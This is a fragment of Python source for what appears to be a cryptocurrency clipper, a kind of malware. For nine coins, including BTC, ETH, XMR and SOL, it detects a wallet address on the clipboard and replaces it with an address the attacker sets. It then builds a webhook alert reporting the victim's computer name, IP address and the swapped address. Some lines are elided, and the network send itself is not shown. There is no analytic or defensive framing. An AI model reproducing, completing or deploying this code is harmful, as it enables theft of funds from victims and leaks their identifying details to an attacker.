                    ...
                    if btcaddr != "SET BTC ADDRESS HERE":
                        if clipboard_text != btcaddr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected BTC address on {comp_name} - IP: {ip_addr} - changed to {btcaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected BTC address on {comp_name} - IP: {ip_addr} - changed to {btcaddr}\n```"
                    ...
                    if ethaddr != "SET ETH ADDRESS HERE":
                        if clipboard_text != ethaddr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected ETH address on {comp_name} - IP: {ip_addr} - changed to {ethaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected ETH address on {comp_name} - IP: {ip_addr} - changed to {ethaddr}\n```"
                    ...
                    if ltcaddr != "SET LTC ADDRESS HERE":
                        if clipboard_text != ltcaddr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected LTC address on {comp_name} - IP: {ip_addr} - changed to {ltcaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected LTC address on {comp_name} - IP: {ip_addr} - changed to {ltcaddr}\n```"
                    ...
                    if xmraddr != "SET XMR ADDRESS HERE":
                        if clipboard_text != xmraddr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected XMR address on {comp_name} - IP: {ip_addr} - changed to {xmraddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected XMR address on {comp_name} - IP: {ip_addr} - changed to {xmraddr}\n```"
                    ...
                    if soladdr != "SET SOL ADDRESS HERE":
                        if clipboard_text != soladdr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected SOL address on {comp_name} - IP: {ip_addr} - changed to {soladdr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected SOL address on {comp_name} - IP: {ip_addr} - changed to {soladdr}\n```"
                    ...
                    if dogeaddr != "SET DOGE ADDRESS HERE":
                        if clipboard_text != dogeaddr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected DOGE address on {comp_name} - IP: {ip_addr} - changed to {dogeaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected DOGE address on {comp_name} - IP: {ip_addr} - changed to {dogeaddr}\n```"
                    ...
                    if xrpaddr != "SET XRP ADDRESS HERE":
                        if clipboard_text != xrpaddr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected XRP address on {comp_name} - IP: {ip_addr} - changed to {xrpaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected XRP address on {comp_name} - IP: {ip_addr} - changed to {xrpaddr}\n```"
                    ...
                    if trxaddr != "SET TRX ADDRESS HERE":
                        if clipboard_text != trxaddr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected TRX address on {comp_name} - IP: {ip_addr} - changed to {trxaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected TRX address on {comp_name} - IP: {ip_addr} - changed to {trxaddr}\n```"
                    ...
                    if bchaddr != "SET BCH ADDRESS HERE":
                        if clipboard_text != bchaddr:
                            ...
                            if webhook_url != "":
                                if ping:
                                    message = {
                                    "content": f"@everyone```\n [subprocess] detected BCH address on {comp_name} - IP: {ip_addr} - changed to {bchaddr}\n```"
                                    }
                                else:
                                    message = {
                                        "content": f"```\n [subprocess] detected BCH address on {comp_name} - IP: {ip_addr} - changed to {bchaddr}\n```"
